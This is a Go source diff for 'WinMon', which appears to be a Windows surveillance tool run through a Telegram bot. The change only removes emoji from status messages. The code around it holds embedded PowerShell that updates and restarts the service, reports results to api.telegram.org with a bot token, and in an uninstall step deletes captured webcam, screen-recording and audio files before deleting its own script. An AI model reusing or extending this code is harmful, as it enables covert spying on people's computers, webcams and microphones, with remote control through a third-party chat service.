@@ -45,10 +45,10 @@ func UpdateService(tempExePath, botToken string, chatID int64) error {
 	var successMsg string
 	if service.IsRunningAsService() {
 		startCmd = "Start-Service -Name WinMon -ErrorAction SilentlyContinue"
-		successMsg = "🟢 WinMon service has been updated successfully!"
+		successMsg = "WinMon service has been updated successfully!"
 	} else {
 		startCmd = fmt.Sprintf(`Start-Process -FilePath "%s" -ArgumentList "-console"`, slashedExe)
-		successMsg = "🟢 WinMon (Console Mode) has been updated successfully!"
+		successMsg = "WinMon (Console Mode) has been updated successfully!"
 	}
 
 	psScript := fmt.Sprintf(`
@@ -65,7 +65,7 @@ try {
     $body = @{ chat_id = "%[4]d"; text = "%[5]s" }
     Invoke-RestMethod -Uri "https://api.telegram.org/bot%[6]s/sendMessage" -Method Post -Body $body
 } catch {
-    $errText = "🔴 Update failed on this PC during copy: " + $_.Exception.Message
+    $errText = "[Error] Update failed on this PC during copy: " + $_.Exception.Message
     $body = @{ chat_id = "%[4]d"; text = $errText }
     Invoke-RestMethod -Uri "https://api.telegram.org/bot%[6]s/sendMessage" -Method Post -Body $body
 }
@@ -131,7 +131,7 @@ Remove-Item -Path "C:\Windows\Temp\webcam.jpg" -Force -ErrorAction SilentlyConti
 Remove-Item -Path "C:\Windows\Temp\record.gif" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\audio.wav" -Force -ErrorAction SilentlyContinue
 
-$body = @{ chat_id = "%[5]d"; text = "💥 WinMon service and all associated local files have been completely removed from this PC." }
+$body = @{ chat_id = "%[5]d"; text = "WinMon service and all associated local files have been completely removed from this PC." }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot%[6]s/sendMessage" -Method Post -Body $body
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
 `, slashedExe, slashedConfig, slashedState, slashedExeDir, chatID, botToken)
